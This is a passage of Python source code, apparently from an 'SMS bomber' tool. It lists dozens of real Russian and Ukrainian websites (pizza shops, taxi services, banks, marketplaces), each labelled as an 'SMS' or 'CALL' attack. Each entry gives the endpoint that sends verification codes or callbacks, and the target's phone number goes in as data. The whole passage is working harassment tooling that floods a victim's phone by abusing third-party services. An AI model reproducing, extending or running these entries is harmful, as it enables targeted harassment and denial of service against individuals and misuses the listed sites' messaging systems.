            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Nn-card', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://nn-card.ru/api/1.0/covid/login',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Oapi
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Oapi', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Ok
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Ok', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Okeansushi
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Okeansushi', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://okeansushi.ru/includes/contact.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Ontaxi
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Ontaxi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://ontaxi.com.ua/api/v2/web/client',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Osaka161
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Osaka161', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.osaka161.ru/local/tools/webstroy.webservice.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Ozon
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Ozon', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Panpizza
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Panpizza', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Partner
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Partner', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://partner.uklon.com.ua/api/v1/registration/sendcode',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Pass
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Pass', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://pass.rutube.ru/api/accounts/phone/send-password/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Paylate
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Paylate', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://paylate.ru/registry',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Piroginomerodin
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Piroginomerodin', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://piroginomerodin.ru/index.php?route=sms/login/sendreg',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Pizza46
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Pizza46', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://pizza46.ru/ajaxGet.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Pizzakazan
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Pizzakazan', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://pizzakazan.com/auth/ajax.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Pizzasinizza
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Pizzasinizza', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://pizzasinizza.ru/api/phoneCode.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Pliskov
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Pliskov', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Qlean
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Qlean', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://qlean.ru/clients-api/v2/sms_codes/auth/request_code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # R-ulybka
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'R-ulybka', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.r-ulybka.ru/login/form_ajax.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Rendez-vous
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Rendez-vous', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Richfamily
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Richfamily', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Rieltor
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Rieltor', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://rieltor.ua/api/users/register-sms/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Rutaxi
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Rutaxi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://rutaxi.ru/ajax_auth.html',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Sayoris
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sayoris', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://sayoris.ru/?route=parse/whats',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Secure
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Secure', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://secure.ubki.ua/b2_api_xml/ubki/auth',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Secure
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Secure', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://secure.online.ua/ajax/check_phone/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Shafa
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Shafa', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://shafa.ua/api/v3/graphiql',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Shopandshow
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Shopandshow', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://shopandshow.ru/sms/password-request/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Smart
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Smart', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://smart.space/api/users/request_confirmation_code/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Sms4b
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sms4b', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Sportmaster
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Sportmaster', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://www.sportmaster.ua/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Sportmaster
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sportmaster', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://www.sportmaster.ru/user/session/sendSmsCode.do',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Suandshi
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Suandshi', 'anonymous': 'No'},
            'method': 'get',
            'url': 'https://suandshi.ru/mobile_api/register_mobile_user',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Sushi-profi
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Sushi-profi', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.sushi-profi.ru/api/order/order-call/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Sushifuji
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sushifuji', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://sushifuji.ru/sms_send_ajax.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Sushigourmet
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Sushigourmet', 'anonymous': 'No'},
            'method': 'post',
            'url': 'http://sushigourmet.ru/auth',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Tabasko
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Tabasko', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://tabasko.su/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Tarantino-family
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Tarantino-family', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.tarantino-family.com/wp-admin/admin-ajax.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Taxi-ritm
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Taxi-ritm', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Terra-1
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Terra-1', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://terra-1.indriverapp.com/api/authorization?locale=ru',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Thehive
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Thehive', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://thehive.pro/auth/signup',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Top-shop
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Top-shop', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.top-shop.ru/login/loginByPhone/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Topbladebar
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Topbladebar', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://topbladebar.ru/user_account/ajax222.php?do=sms_code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Uklon
        {
            'info': {'country': 'UA', 'attack': 'SMS', 'website': 'Uklon', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://uklon.com.ua/api/v1/account/code/send',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Vladimir
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Vladimir', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://vladimir.edostav.ru/site/CheckAuthLogin',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Xn---72-5cdaa0cclp5fkp4ew
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Xn---72-5cdaa0cclp5fkp4ew', 'anonymous': 'No'},
            'method': 'post',
            'url': 'http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Xn--80aaispoxqe9b
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Xn--80aaispoxqe9b', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Yaponchik
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Yaponchik', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://yaponchik.net/login/login.php',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
        # Zoloto585
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Zoloto585', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://zoloto585.ru/api/bcard/reg/',
            'headers': user_agent()[0],
            'data': {'phone': number},
        },
    ]
